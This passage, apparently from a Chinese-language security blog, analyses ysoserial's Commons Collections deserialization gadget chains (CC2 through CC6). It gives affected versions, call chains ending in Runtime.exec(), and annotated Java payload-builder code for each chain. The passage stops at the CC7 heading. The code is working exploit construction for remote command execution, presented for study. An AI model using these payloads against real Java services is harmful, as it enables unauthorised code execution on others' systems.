<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Queue&lt;Object&gt; <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 构造 TemplatesImpl</span></span><br><span class="line">	<span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(command);</span><br><span class="line">    </span><br><span class="line">	<span class="comment">// 假的方法名称 toString</span></span><br><span class="line">	<span class="keyword">final</span> InvokerTransformer transformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;toString&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>], <span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 使用 transformer 构造 PriorityQueue</span></span><br><span class="line">	<span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;Object&gt;(<span class="number">2</span>,<span class="keyword">new</span> TransformingComparator(transformer));</span><br><span class="line">    </span><br><span class="line">	<span class="comment">// 先设置正常的变量值</span></span><br><span class="line">	queue.add(<span class="number">1</span>);</span><br><span class="line">	queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 修改方法名称</span></span><br><span class="line">	Reflections.setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 替换队列内的变量</span></span><br><span class="line">	<span class="keyword">final</span> Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, <span class="string">&quot;queue&quot;</span>);</span><br><span class="line">	queueArray[<span class="number">0</span>] = templates; <span class="comment">// jdk7u21</span></span><br><span class="line">	queueArray[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> queue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h2><blockquote>
<p>CC2(source) + CC1(sink)<br>利用 TemplatesImpl 承载恶意调用链<br>使用 InstantiateTransformer 代替 InvokerTransformer，通过 TrAXFilter 的构造方法调用 newTransformer<br>放在特性和 TransformedMap 相同的 lazyMap 中<br>通过动态代理 AnnotationInvocationHandler 的反序列化触发</p>
</blockquote>
<p>适用版本</p>
<ul>
<li>commons-collections 3.1</li>
<li>jdk7u21<ul>
<li>使用 <code>TemplatesImpl</code> 的变量 <code>_bytecodes</code> 承载恶意字节码</li>
</ul>
</li>
</ul>
<p>利用链</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    ObjectInputStream.readObject()</span><br><span class="line">        AnnotationInvocationHandler.readObject()</span><br><span class="line">            Map(Proxy).entrySet()</span><br><span class="line">                AnnotationInvocationHandler.invoke()</span><br><span class="line">                    LazyMap.get()</span><br><span class="line">                        ChainedTransformer.transform()</span><br><span class="line">                            ConstantTransformer.transform()</span><br><span class="line">                            InstantiateTransformer.transform()</span><br><span class="line">                                Class.newInstance()</span><br><span class="line">                                    TrAXFilter#TrAXFilter()</span><br><span class="line">                                    TemplatesImpl.newTransformer()</span><br><span class="line">                                        TemplatesImpl.getTransletInstance()</span><br><span class="line">                                        TemplatesImpl.defineTransletClasses()</span><br><span class="line">                                            ClassLoader.defineClass()</span><br><span class="line">                                            Class.newInstance()</span><br><span class="line">                                              ...</span><br><span class="line">                                                MaliciousClass.&lt;clinit&gt;()</span><br><span class="line">                                                ...</span><br><span class="line">                                                    Runtime.exec()</span><br></pre></td></tr></table></figure>

<img src="https://i.loli.net/2021/11/12/RNrPcWsiQm2Ak8G.png">

<p>InstantiateTransformer 的 transform 方法会创建类实例。TrAXFilter 类的构造函数接受 Templates 类型的参数，并执行 <code>TemplatesImpl.newTransformer</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span></span></span><br><span class="line"><span class="function">    TransformerConfigurationException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _templates = templates;</span><br><span class="line">    _transformer = (TransformerImpl) templates.newTransformer();</span><br><span class="line">    _transformerHandler = <span class="keyword">new</span> TransformerHandlerImpl(_transformer);</span><br><span class="line">    _overrideDefaultParser = _transformer.overrideDefaultParser();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ysoserial.payloads.CommonsCollections3#getObject 可以看出前面和 CC2 一样构造 templatesImpl 承载恶意代码，中间使用 InstantiateTransformer 构造链式触发器 ChainedTransformer，最后和 CC1 一样用 LazyMap 和 AnnotationInvocationHandler 动态代理封装。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 构造 TemplatesImp 承载恶意代码</span></span><br><span class="line">	Object templatesImpl = Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// inert chain for setup</span></span><br><span class="line">	<span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(</span><br><span class="line">		<span class="keyword">new</span> Transformer[]&#123; <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;);</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// real chain for after setup</span></span><br><span class="line">	<span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">			<span class="keyword">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class="line">			<span class="keyword">new</span> InstantiateTransformer(</span><br><span class="line">					<span class="keyword">new</span> Class[] &#123; Templates.class &#125;,</span><br><span class="line">					<span class="keyword">new</span> Object[] &#123; templatesImpl &#125; )&#125;;</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 同 CC1</span></span><br><span class="line">    <span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">	<span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">	<span class="keyword">final</span> Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);</span><br><span class="line">	<span class="keyword">final</span> InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class="line">	</span><br><span class="line">    Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers); <span class="comment">// arm with actual transformer chain</span></span><br><span class="line">	</span><br><span class="line">    <span class="keyword">return</span> handler;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h2><blockquote>
<p>CC2 + CC3<br>利用 InstantiateTransformer 构造执行链</p>
</blockquote>
<p>适用版本</p>
<ul>
<li>commons-collections 4.0</li>
<li>jdk7u21<ul>
<li>使用 <code>TemplatesImpl</code> 的变量 <code>_bytecodes</code> 承载恶意字节码</li>
</ul>
</li>
</ul>
<p>利用链</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">	ObjectInputStream.readObject()</span><br><span class="line">		PriorityQueue.readObject()</span><br><span class="line">			...</span><br><span class="line">				TransformingComparator.compare()</span><br><span class="line">                    ChainedTransformer.transform()</span><br><span class="line">                        ConstantTransformer.transform()</span><br><span class="line">                        InstantiateTransformer.transform()</span><br><span class="line">                            Class.newInstance()</span><br><span class="line">                                TrAXFilter#TrAXFilter()</span><br><span class="line">                                TemplatesImpl.newTransformer()</span><br><span class="line">                                    TemplatesImpl.getTransletInstance()</span><br><span class="line">                                    TemplatesImpl.defineTransletClasses()</span><br><span class="line">                                        ClassLoader.defineClass()</span><br><span class="line">                                        Class.newInstance()</span><br><span class="line">                                          ...</span><br><span class="line">                                            MaliciousClass.&lt;clinit&gt;()</span><br><span class="line">                                            ...</span><br><span class="line">                                                Runtime.exec()</span><br></pre></td></tr></table></figure>

<img src="https://i.loli.net/2021/11/12/IkfLuarVRoy5Sni.png">

<p>ysoserial.payloads.CommonsCollections4#getObject 用 ChainedTransformer 代替了 InvokerTransformer 作为比较器，且构造方式同 CC3，利用 InstantiateTransformer 触发。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Queue&lt;Object&gt; <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">	Object templates = Gadgets.createTemplatesImpl(command);</span><br><span class="line">	</span><br><span class="line">    ConstantTransformer constant = <span class="keyword">new</span> ConstantTransformer(String.class);</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// mock method name until armed</span></span><br><span class="line">	Class[] paramTypes = <span class="keyword">new</span> Class[] &#123; String.class &#125;;</span><br><span class="line">	Object[] args = <span class="keyword">new</span> Object[] &#123; <span class="string">&quot;foo&quot;</span> &#125;;</span><br><span class="line">	InstantiateTransformer instantiate = <span class="keyword">new</span> InstantiateTransformer(</span><br><span class="line">			paramTypes, args);</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// grab defensively copied arrays</span></span><br><span class="line">	paramTypes = (Class[]) Reflections.getFieldValue(instantiate, <span class="string">&quot;iParamTypes&quot;</span>);</span><br><span class="line">	args = (Object[]) Reflections.getFieldValue(instantiate, <span class="string">&quot;iArgs&quot;</span>);</span><br><span class="line">	</span><br><span class="line">    ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123; constant, instantiate &#125;);</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// create queue with numbers</span></span><br><span class="line">	PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;Object&gt;(<span class="number">2</span>, <span class="keyword">new</span> TransformingComparator(chain));</span><br><span class="line">	queue.add(<span class="number">1</span>);</span><br><span class="line">	queue.add(<span class="number">1</span>);</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// swap in values to arm</span></span><br><span class="line">	Reflections.setFieldValue(constant, <span class="string">&quot;iConstant&quot;</span>, TrAXFilter.class);</span><br><span class="line">	paramTypes[<span class="number">0</span>] = Templates.class;</span><br><span class="line">	args[<span class="number">0</span>] = templates;</span><br><span class="line">	</span><br><span class="line">    <span class="keyword">return</span> queue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h2><blockquote>
<p>前面 RMI 反序列化漏洞利用中提到<br>将 CC1 中的 AnnotationInvocationHandler 替换为 BadAttributeValueExpException<br>利用 CC1 中的 LazyMap 构造 TiedMapEntry，再用于构造 BadAttributeValueExpException</p>
</blockquote>
<p>适用版本</p>
<ul>
<li>commons-collections 3.1 ~ 3.2.1</li>
<li>jdk 1.8</li>
</ul>
<p>利用链</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    ObjectInputStream.readObject()</span><br><span class="line">        BadAttributeValueExpException.readObject()</span><br><span class="line">            TiedMapEntry.toString()</span><br><span class="line">                LazyMap.get()</span><br><span class="line">                    ChainedTransformer.transform()</span><br><span class="line">                        ConstantTransformer.transform()</span><br><span class="line">                        InvokerTransformer.transform()</span><br><span class="line">                            Method.invoke()</span><br><span class="line">                                Class.getMethod()</span><br><span class="line">                        InvokerTransformer.transform()</span><br><span class="line">                            Method.invoke()</span><br><span class="line">                                Runtime.getRuntime()</span><br><span class="line">                        InvokerTransformer.transform()</span><br><span class="line">                            Method.invoke()</span><br><span class="line">                                Runtime.exec()</span><br></pre></td></tr></table></figure>

<img src="https://i.loli.net/2021/09/16/4tevUmukcFwMQT1.jpg" >

<p>在 BadAttributeValueExpException 的 readObject 方法中，会调用成员变量 <code>val</code> 的 <code>toString</code> 方法</p>
<ul>
<li>这里将 <code>val</code> 设置为 TiedMapEntry</li>
<li>TiedMapEntry 会调用自身的 <code>getKey</code> 和 <code>getValue</code> 方法<ul>
<li><code>getKey</code> 方法中调用成员变量 map 的 <code>get</code> 方法</li>
<li>这里将 map 设置为 LazyMap（@CC1）</li>
</ul>
</li>
</ul>
<p>ysoserial.payloads.CommonsCollections5 注意这里利用反射设置 <code>val</code> 的值，因为 BadAttributeValueExpException 的构造函数会判断是否为空，如果不为空在序列化时就会执行 <code>toString()</code>，那么反序列化时，因为传入的 entry 已经是字符串，所以就不会触发 toString 方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> BadAttributeValueExpException <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 构造恶意调用链 ChainedTransformer</span></span><br><span class="line">	<span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> String[] &#123; command &#125;;</span><br><span class="line">	<span class="comment">// inert chain for setup</span></span><br><span class="line">	<span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(</span><br><span class="line">	        <span class="keyword">new</span> Transformer[]&#123; <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;);</span><br><span class="line">	<span class="comment">// real chain for after setup</span></span><br><span class="line">	<span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">			<span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">			<span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">				String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">				<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">			<span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">				Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">				<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">			<span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">				<span class="keyword">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class="line">			<span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;;</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 构造 LazyMap，将其 factory 变量设置为 ChainedTransformer</span></span><br><span class="line">	<span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">	<span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 使用 LazyMap 构造 TiedMapEntry</span></span><br><span class="line">	TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 将 BadAttributeValueExpException 的成员变量 val 设置为 TiedMapEntry</span></span><br><span class="line">	BadAttributeValueExpException val = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">	Field valfield = val.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">    Reflections.setAccessible(valfield);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 利用反射赋值</span></span><br><span class="line">	valfield.set(val, entry);</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 将 ChainedTransformer 中的 transformer 数组替换为恶意调用序列</span></span><br><span class="line">	Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers); <span class="comment">// arm with actual transformer chain</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h2><blockquote>
<p>CC5 + CC1<br>通过对 TiedMapEntry#getValue 的调用触发 LazyMap#get<br>利用 ChainedTransformer 构造链式执行</p>
</blockquote>
<p>适用版本</p>
<ul>
<li>commons-collections 3.1</li>
<li>jdk 1.7</li>
</ul>
<p>利用链</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    ObjectInputStream.readObject()</span><br><span class="line">        HashSet.readObject()</span><br><span class="line">            HashMap.put()</span><br><span class="line">            HashMap.hash()</span><br><span class="line">                TiedMapEntry.hashCode()</span><br><span class="line">                TiedMapEntry.getValue()</span><br><span class="line">                    LazyMap.get()</span><br><span class="line">                        ChainedTransformer.transform()</span><br><span class="line">                        InvokerTransformer.transform()</span><br><span class="line">                            Method.invoke()</span><br><span class="line">                                Runtime.exec()</span><br></pre></td></tr></table></figure>

<img src="https://i.loli.net/2021/11/12/jQaCHvLVX7IfBne.png" >

<p>TiedMapEntry 中的 equals、hashCode、toString 方法中都调用了 TiedMapEntry#getValue，这里选择 hashCode 方法作为入口（CC5 用的是 toString）。</p>
<p>HashSet#readObject 反序列化时，会调用 map.put(e, PRESENT)方法，后续调用 HashMap#put，在其中会调用 HashMap#put 计算哈希值，最后触发 TiedMapEntry.hashCode；</p>
<p>map 可以控制为 HashMap，传入的第一个参数 e 是使用 readObject 读取，相应地在 writeObject 中写入的 e 是 map.keySet，因此通过反射修改 keySet 的返回结果为 TiedMapEntry。</p>
<p>ysoserial.payloads.CommonsCollections6#getObject 首先定义 ChainedTransformer 和 TiedMapEntry（同CC5），然后通过反射将 TiedMapEntry 赋值给 HashSet 的 keySet。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Serializable <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 构造恶意调用链 ChainedTransformer</span></span><br><span class="line">    <span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> String[] &#123; command &#125;;</span><br><span class="line">    <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                    String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                    <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                    Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                    <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                    <span class="keyword">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;;</span><br><span class="line">    Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造 LazyMap，将其 factory 变量设置为 ChainedTransformer</span></span><br><span class="line">    <span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">    <span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 使用 LazyMap 构造 TiedMapEntry</span></span><br><span class="line">    TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过反射修改 keySet 的返回结果为 TiedMapEntry</span></span><br><span class="line">    <span class="comment">// hashset 的 map 属性（HashMap）</span></span><br><span class="line">    HashSet map = <span class="keyword">new</span> HashSet(<span class="number">1</span>);   <span class="comment">// 容量为 1</span></span><br><span class="line">    map.add(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line">    Field f = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        f = HashSet.class.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">        f = HashSet.class.getDeclaredField(<span class="string">&quot;backingMap&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    Reflections.setAccessible(f);</span><br><span class="line">    HashMap innimpl = (HashMap) f.get(map);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// hashmap 的 table 属性（节点 node 数组）</span></span><br><span class="line">    Field f2 = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        f2 = HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">        f2 = HashMap.class.getDeclaredField(<span class="string">&quot;elementData&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    Reflections.setAccessible(f2);</span><br><span class="line">    Object[] array = (Object[]) f2.get(innimpl);</span><br><span class="line">    <span class="comment">// 第一个节点</span></span><br><span class="line">    Object node = array[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span>(node == <span class="keyword">null</span>)&#123;</span><br><span class="line">        node = array[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将 TiedMapEntry 存入 node 节点的 key</span></span><br><span class="line">    Field keyField = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        keyField = node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">        keyField = Class.forName(<span class="string">&quot;java.util.MapEntry&quot;</span>).getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    Reflections.setAccessible(keyField);</span><br><span class="line">    keyField.set(node, entry);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> map;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h2><blockquote>
<p>和 CC6/CC5/CC1 类似，使用 ChainedTransformer 承载恶意代码<br>通过 AbstractMap#equals 来触发 LazyMap#get 方法的调用</p>
</blockquote>
<p>适用版本</p>
<ul>
<li>commons-collections 3.1</li>
<li>jdk 1.8</li>
</ul>
<p>利用链</p>
